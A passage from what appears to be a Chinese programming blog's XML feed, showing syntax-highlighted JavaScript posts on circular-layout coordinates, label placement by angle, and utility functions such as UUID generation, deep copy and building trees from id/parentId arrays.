  <span class="token keyword">if</span> <span class="token punctuation">(</span>endAngle <span class="token operator">-</span> startAngle <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    intervalAngle <span class="token operator">=</span> <span class="token number">360</span> <span class="token operator">/</span> number<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    intervalAngle <span class="token operator">=</span> <span class="token function">normalizeAngle</span><span class="token punctuation">(</span>endAngle <span class="token operator">-</span> startAngle<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token punctuation">(</span>number <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">||</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token comment">// 根据布局数量与间隔角度计算所有布局位置</span>
  <span class="token keyword">const</span> positionArr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> number<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> angle <span class="token operator">=</span> <span class="token function">normalizeAngle</span><span class="token punctuation">(</span>startAngle <span class="token operator">+</span> intervalAngle <span class="token operator">*</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> x <span class="token operator">=</span> centerPosition<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> r <span class="token operator">*</span> Math<span class="token punctuation">.</span><span class="token function">sin</span><span class="token punctuation">(</span><span class="token punctuation">(</span>angle <span class="token operator">*</span> Math<span class="token punctuation">.</span><span class="token constant">PI</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">180</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> y <span class="token operator">=</span> centerPosition<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> r <span class="token operator">*</span> Math<span class="token punctuation">.</span><span class="token function">cos</span><span class="token punctuation">(</span><span class="token punctuation">(</span>angle <span class="token operator">*</span> Math<span class="token punctuation">.</span><span class="token constant">PI</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">180</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    positionArr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
      angle<span class="token punctuation">,</span>
      position<span class="token operator">:</span> <span class="token punctuation">[</span>x<span class="token punctuation">,</span> y<span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> positionArr<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="标签位置-应用场景"><a href="#标签位置-应用场景" class="headerlink" title="标签位置-应用场景"></a>标签位置-应用场景</h2><p>使用圆形布局后，当元素标签不放在元素上居中显示，而要根据相对圆心的位置，显示在上、右、下、左等不同方位时，使用此方法计算。</p>
<h2 id="标签位置-代码示例"><a href="#标签位置-代码示例" class="headerlink" title="标签位置-代码示例"></a>标签位置-代码示例</h2><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">/**
 * 根据传入的角度（当前元素相对圆心的角度）计算出标签位置，简单模式只计算左右，非简单模式计算上下左右
 * @param &#123;number&#125; angle 传入的角度
 * @param &#123;boolean&#125; simple 是否简单模式
 * @returns 位置字符串
 */</span>
<span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">calcLabelPositionByAngle</span><span class="token punctuation">(</span><span class="token parameter">angle<span class="token punctuation">,</span> simple <span class="token operator">=</span> <span class="token boolean">true</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>simple<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>angle <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> angle <span class="token operator">&lt;</span> <span class="token number">180</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> <span class="token string">"right"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> <span class="token string">"left"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>angle <span class="token operator">></span> <span class="token number">275</span> <span class="token operator">||</span> angle <span class="token operator">&lt;=</span> <span class="token number">45</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> <span class="token string">"top"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>angle <span class="token operator">></span> <span class="token number">45</span> <span class="token operator">&amp;&amp;</span> angle <span class="token operator">&lt;=</span> <span class="token number">135</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> <span class="token string">"right"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>angle <span class="token operator">></span> <span class="token number">135</span> <span class="token operator">&amp;&amp;</span> angle <span class="token operator">&lt;=</span> <span class="token number">215</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> <span class="token string">"bottom"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>angle <span class="token operator">></span> <span class="token number">215</span> <span class="token operator">&amp;&amp;</span> angle <span class="token operator">&lt;=</span> <span class="token number">275</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> <span class="token string">"left"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> <span class="token string">"top"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>圆形位置坐标</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript自己的工具函数</title>
    <url>/2019/02/09/javascript%E8%87%AA%E5%B7%B1%E7%9A%84%E5%B7%A5%E5%85%B7%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<p>使用 export 语法将工具函数暴露出去</p>
<span id="more"></span>

<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/**
 * @function 生成UUID
 * @export 导出为工具函数
 * @return &#123;String&#125; 返回值为生成的UUID
 */</span>
<span class="token keyword">export</span> <span class="token keyword">const</span> <span class="token function-variable function">generateUUID</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">let</span> date <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">let</span> uuid <span class="token operator">=</span> <span class="token string">"xxxx_xxxx_xxxx_yxxx"</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[xy]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">char</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> random <span class="token operator">=</span> <span class="token punctuation">(</span>date <span class="token operator">+</span> Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">16</span> <span class="token operator">|</span> <span class="token number">0</span><span class="token punctuation">;</span>
    date <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>date <span class="token operator">/</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>char <span class="token operator">==</span> <span class="token string">"x"</span> <span class="token operator">?</span> random <span class="token operator">:</span> <span class="token punctuation">(</span>random <span class="token operator">&amp;</span> <span class="token number">0x7</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> uuid<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token comment">/**
 * @function 深拷贝对象
 * @export 导出为工具函数
 * @param &#123;Object|Array&#125; 入参为被拷贝对象或数组
 * @return &#123;Object|Array&#125; 返回值为拷贝出的对象或数组
 */</span>
<span class="token keyword">export</span> <span class="token keyword">const</span> <span class="token function-variable function">deepCopyObject</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">let</span> newObj<span class="token punctuation">;</span>
  Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">(</span>newObj <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token punctuation">(</span>newObj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> keyArray <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
  keyArray<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">key</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"object"</span> <span class="token operator">&amp;&amp;</span> obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      newObj<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">deepCopyObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
      newObj<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> newObj<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token comment">/**
 * @function 根据id和parentId生成树
 * @export 导出为工具函数
 * @param &#123;Object&#125; 所有参数都在对象中
 * @param &#123;Array&#125; [data=[]] 生成树的原始一维数组，默认为[]
 * @param &#123;String|Number&#125; [rootId = 0] 根节点id，默认为0
 * @param &#123;String&#125; [id="id"] id字段名，默认为"id"
 * @param &#123;String&#125; [parentId="parentId"] parentId字段名，默认为"parentId"
 * @param &#123;String&#125; [children="children"] children字段名，默认为"children"
 * @return &#123;Array&#125; 返回生成树的数组
 */</span>
<span class="token keyword">export</span> <span class="token keyword">const</span> createTree <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">&#123;</span> data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> rootId <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> id <span class="token operator">=</span> <span class="token string">"id"</span><span class="token punctuation">,</span> parentId <span class="token operator">=</span> <span class="token string">"parentId"</span><span class="token punctuation">,</span> children <span class="token operator">=</span> <span class="token string">"children"</span> <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token comment">// 过滤遍历树原始数组，当前遍历项为父节点，返回根节点数组</span>
  <span class="token keyword">return</span> data<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">parent</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    parent<span class="token punctuation">.</span>expand <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token comment">// 嵌套过滤遍历树原始数组，当前遍历项为子节点，返回当前父节点的所有子节点</span>
    <span class="token keyword">let</span> branchArr <span class="token operator">=</span> data<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">child</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> parent<span class="token punctuation">[</span>id<span class="token punctuation">]</span> <span class="token operator">==</span> child<span class="token punctuation">[</span>parentId<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>branchArr<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token comment">// 若存在子节点，则给父节点添加一个children属性，并将branchArr赋值给父节点</span>
      parent<span class="token punctuation">[</span>children<span class="token punctuation">]</span> <span class="token operator">=</span> branchArr<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> parent<span class="token punctuation">[</span>parentId<span class="token punctuation">]</span> <span class="token operator">==</span> rootId<span class="token punctuation">;</span> <span class="token comment">//返回根节点数组</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token comment">/**
 * 通过id与parentId的一维数组生成树（Typescript）
 * 该方法相较上面的filter递归方式执行效率更高，时间复杂度由O(n2)降低为O(n)
 * @param 配置对象 data为原始数据；rootId为根节点对应的id值；idAttr为id字段名，默认为id；parentAttr为父id字段名，默认为parentId；childrenAttr为子节点字段名，默认为children
 * @returns 树数组
 */</span>
<span class="token keyword">export</span> <span class="token keyword">const</span> createTree <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
  data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
  rootId <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>
  idAttr <span class="token operator">=</span> <span class="token string">"id"</span><span class="token punctuation">,</span>
  parentAttr <span class="token operator">=</span> <span class="token string">"parentId"</span><span class="token punctuation">,</span>
  childrenAttr <span class="token operator">=</span> <span class="token string">"children"</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
  data<span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">[</span>key<span class="token operator">:</span> string<span class="token punctuation">]</span><span class="token operator">:</span> any <span class="token punctuation">&#125;</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
  rootId<span class="token operator">?</span><span class="token operator">:</span> number<span class="token punctuation">,</span>
  idAttr<span class="token operator">?</span><span class="token operator">:</span> string<span class="token punctuation">,</span>
  parentAttr<span class="token operator">?</span><span class="token operator">:</span> string<span class="token punctuation">,</span>
  childrenAttr<span class="token operator">?</span><span class="token operator">:</span> string<span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token comment">// 生成用于查找父节点的map</span>
  <span class="token keyword">const</span> map <span class="token operator">=</span> data<span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">map<span class="token punctuation">,</span> item<span class="token punctuation">,</span> index</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    map<span class="token punctuation">[</span>item<span class="token punctuation">[</span>idAttr<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> index<span class="token punctuation">;</span>
    item<span class="token punctuation">[</span>childrenAttr<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> map<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// 将每个元素挂载到对应的父节点</span>
  <span class="token keyword">return</span> data<span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">tree<span class="token punctuation">,</span> item<span class="token punctuation">,</span> index<span class="token punctuation">,</span> arr</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 若当前节点的父节点为根节点，则放入最终的树数组</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>item<span class="token punctuation">[</span>parentAttr<span class="token punctuation">]</span> <span class="token operator">===</span> rootId<span class="token punctuation">)</span> tree<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 否则将当前节点挂载到相应的父节点上</span>
    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
      <span class="token comment">// 判断父节点是否存在于map中，存在则挂载，否则报错</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">[</span>item<span class="token punctuation">[</span>parentAttr<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> arr<span class="token punctuation">[</span>map<span class="token punctuation">[</span>item<span class="token punctuation">[</span>parentAttr<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>childrenAttr<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">else</span> console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Id </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>item<span class="token punctuation">[</span>idAttr<span class="token punctuation">]</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> No Parent Found</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> tree<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token comment">/**
 * @function iview手风琴树（每次只展开一个树节点）
 * @export 导出为工具函数
 * @param &#123;Object&#125; 入参1：当前节点对象
 * @param &#123;Array&#125; 入参2：树的数组数据
 */</span>
<span class="token keyword">export</span> <span class="token keyword">const</span> <span class="token function-variable function">accordionTree</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">currentNode<span class="token punctuation">,</span> treeData</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token comment">/**
   * @function 查找当前节点父节点
   * @param &#123;Array&#125; 入参1：树的数组数据
   * @param &#123;Object&#125; 入参2： 当前节点对象
   * @return &#123;Object&#125; 返回值为当前节点的父节点对象
   */</span>
  <span class="token keyword">function</span> <span class="token function">findParent</span><span class="token punctuation">(</span><span class="token parameter">treeData<span class="token punctuation">,</span> currentNode</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 声明最终父节点</span>
    <span class="token keyword">let</span> finalParentNode <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token comment">/**
     * @function 查找当前节点父节点的内部递归函数
     * @param &#123;Array&#125; 入参1：树的数组数据
     * @param &#123;Object&#125; 入参2：当前点击节点对象
     * @param &#123;Object&#125; 入参3：此时遍历节点的父节点
     */</span>
    <span class="token keyword">function</span> <span class="token function">findParentInner</span><span class="token punctuation">(</span><span class="token parameter">treeData<span class="token punctuation">,</span> currentNode<span class="token punctuation">,</span> parentNode</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token comment">// 内部查找函数，若当前节点nodeKey与遍历节点nodeKey相同时，则此时的parentNode为要找的最终父节点，否则判断遍历节点是否存在子节点，若存在则递归执行函数，若不存在则什么都不做</span>
      treeData<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span> <span class="token operator">=></span>
        item<span class="token punctuation">.</span>nodeKey <span class="token operator">===</span> currentNode<span class="token punctuation">.</span>nodeKey
          <span class="token operator">?</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
              finalParentNode <span class="token operator">=</span> parentNode<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
          <span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
              item<span class="token punctuation">.</span>children <span class="token operator">?</span> <span class="token function">findParentInner</span><span class="token punctuation">(</span>item<span class="token punctuation">.</span>children<span class="token punctuation">,</span> currentNode<span class="token punctuation">,</span> item<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
      <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">// 执行内部函数</span>
    <span class="token function">findParentInner</span><span class="token punctuation">(</span>treeData<span class="token punctuation">,</span> currentNode<span class="token punctuation">,</span> finalParentNode<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> finalParentNode<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token comment">/**
   * @function 折叠树其它节点
   * @param &#123;Array&#125; 入参1：树的数组数据
   * @param &#123;Object&#125; 入参2：当前点击节点对象
   */</span>
  <span class="token keyword">function</span> <span class="token function">collapseTree</span><span class="token punctuation">(</span><span class="token parameter">treeData<span class="token punctuation">,</span> currentNode</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    treeData<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
      <span class="token comment">// 若遍历节点为折叠则什么都不做，若为展开则判断遍历节点与当前节点nodeKey是否相同，若相同则什么都不做，否则设为折叠</span>
      item<span class="token punctuation">.</span>expand
        <span class="token operator">?</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
            item<span class="token punctuation">.</span>nodeKey <span class="token operator">===</span> currentNode<span class="token punctuation">.</span>nodeKey <span class="token operator">?</span> <span class="token string">""</span> <span class="token operator">:</span> <span class="token punctuation">(</span>item<span class="token punctuation">.</span>expand <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token comment">// 若遍历节点存在子节点则递归此函数，否则什么都不做</span>
      item<span class="token punctuation">.</span>children <span class="token operator">?</span> <span class="token function">collapseTree</span><span class="token punctuation">(</span>item<span class="token punctuation">.</span>children<span class="token punctuation">,</span> currentNode<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token comment">// 找到当前点击节点的父节点</span>
  <span class="token keyword">let</span> parentNode <span class="token operator">=</span> <span class="token function">findParent</span><span class="token punctuation">(</span>treeData<span class="token punctuation">,</span> currentNode<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// 折叠树，若父节点为null，则为根节点，传入所有树数据（根节点）；若不为null，则传入父节点的子节点</span>
  parentNode <span class="token operator">===</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token function">collapseTree</span><span class="token punctuation">(</span>treeData<span class="token punctuation">,</span> currentNode<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">collapseTree</span><span class="token punctuation">(</span>parentNode<span class="token punctuation">.</span>children<span class="token punctuation">,</span> currentNode<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>参考资料 <a href="https://stackoverflow.com/questions/18017869/build-tree-array-from-flat-array-in-javascript?page=1&tab=votes#tab-top">生成树方法 createTree</a></p>
</blockquote>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>工具函数</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript点与方括号区别</title>
